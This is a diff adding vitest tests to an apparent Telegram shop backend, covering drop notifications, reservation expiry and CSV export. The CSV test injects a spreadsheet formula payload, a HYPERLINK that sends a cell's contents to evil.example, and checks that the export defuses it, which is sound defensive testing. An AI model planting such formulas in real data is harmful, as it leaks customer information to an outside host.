@@ -2,14 +2,17 @@
 import { mkdtempSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
+import { eq } from 'drizzle-orm';
 import type { FastifyInstance } from 'fastify';
 import { afterAll, describe, expect, it } from 'vitest';
 import type { ApiBootstrap } from '@mrak8/shared';
 import { buildApp } from '../src/app.js';
 import { signInitData } from '../src/auth.js';
-import { createBot } from '../src/bot/index.js';
+import { createBot, notifyDrop } from '../src/bot/index.js';
 import { loadConfig, type Config } from '../src/config.js';
 import { migrateDatabase, openDatabase, type Database } from '../src/db/index.js';
+import { orders } from '../src/db/schema.js';
+import { startJobs } from '../src/jobs.js';
 import { seed } from '../src/db/seed.js';
 import { createStorage } from '../src/services/storage.js';
 import { startFakeBotApi } from './fake-bot-api.js';
@@ -154,6 +157,59 @@ describe('F-06 rate limits (and F-20 trusted proxies)', () => {
     const hit = (i: number) => app.inject({ method: 'GET', url: '/dj/1', remoteAddress: '203.0.113.5', headers: { 'x-forwarded-for': `198.51.100.${i % 250}` } });
     for (let i = 0; i < 120; i++) expect((await hit(i)).statusCode).not.toBe(429);
     expect((await hit(120)).statusCode).toBe(429);
+  });
+});
+
+const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
+/** a «drop soon» product (or one whose time has come) with subjects watching it */
+async function watchedDrop(app: FastifyInstance, dropAt: Date, watchers: number[]) {
+  const no = String(1000 + Math.floor(Math.random() * 8999));
+  const r = await app.inject({ method: 'POST', url: '/api/admin/products', headers: tma(ADMIN), payload: { no, slug: `drop-${no}`, title: `DROP ${no}`, category: 'tee', price: 1000, status: 'drop', dropAt: dropAt.toISOString(), sizes: [{ label: 'M', stock: 5, heightMin: null, heightMax: null, length: null, width: null, sleeve: null }] } });
+  const id = r.json().id as number;
+  for (const w of watchers) expect((await app.inject({ method: 'POST', url: `/api/drops/${id}/watch`, headers: tma(w), payload: { on: true } })).statusCode).toBe(200);
+  return id;
+}
+
+describe('F-07 drop notifications', () => {
+  it('a 429 from Telegram is waited out, not lost', async () => {
+    const { app, cfg, db, bot, api } = await makeApp({}, { botMode: 'polling' });
+    const id = await watchedDrop(app, new Date(Date.now() + 86_400_000), [7030, 7031]);
+    api!.failNext('sendMessage', { error_code: 429, description: 'Too Many Requests: retry after 1', parameters: { retry_after: 1 } });
+    expect(await notifyDrop({ cfg, db, storage: createStorage(cfg), log: silent }, bot!, id)).toBe(2);
+  });
+  it('reserves keep expiring while a drop is being announced', async () => {
+    const { app, cfg, db, bot, api } = await makeApp({}, { botMode: 'polling' });
+    await watchedDrop(app, new Date(Date.now() - 1000), [7040]);
+    const p = await stockedProduct(app, 5);
+    const o = await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7041), payload: { items: [{ productId: p.id, size: 'M', qty: 1 }], protocol } });
+    const no = o.json().order.no as string;
+    api!.slow.sendMessage = 3000; // Telegram answering slowly to a big announcement
+    const stop = startJobs({ cfg, db, storage: createStorage(cfg), log: silent }, bot, 200);
+    try {
+      await sleep(150); // the first tick is messaging the watcher now
+      await db.update(orders).set({ reservedUntil: new Date(Date.now() - 1000) }).where(eq(orders.no, no));
+      await sleep(800);
+      const [row] = await db.select().from(orders).where(eq(orders.no, no));
+      expect(row.status).toBe('expired');
+    } finally {
+      stop();
+      delete api!.slow.sendMessage;
+      await sleep(3000); // let the in-flight announcement finish before the database closes
+    }
+  });
+});
+
+describe('F-08 CSV export', () => {
+  it('customer text cannot become an Excel formula', async () => {
+    const { app, product } = await makeApp();
+    const p = await product();
+    const evil = '=HYPERLINK("https://evil.example/?"&H2,"x")';
+    expect((await app.inject({ method: 'POST', url: '/api/orders', headers: tma(7050), payload: { items: [{ productId: p.id, size: 'M', qty: 1 }], protocol: { ...protocol, name: evil, comment: '@SUM(1+1)' } } })).statusCode).toBe(200);
+    const csv = (await app.inject({ method: 'GET', url: '/api/admin/orders.csv', headers: tma(ADMIN) })).body;
+    const cells = csv.split(/[;\r\n]/);
+    expect(cells.filter((c) => /^"[=+\-@]/.test(c))).toEqual([]);
+    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?""&H2,""x"")"`);
+    expect(csv).toContain(`"'@SUM(1+1)"`);
   });
 });
 
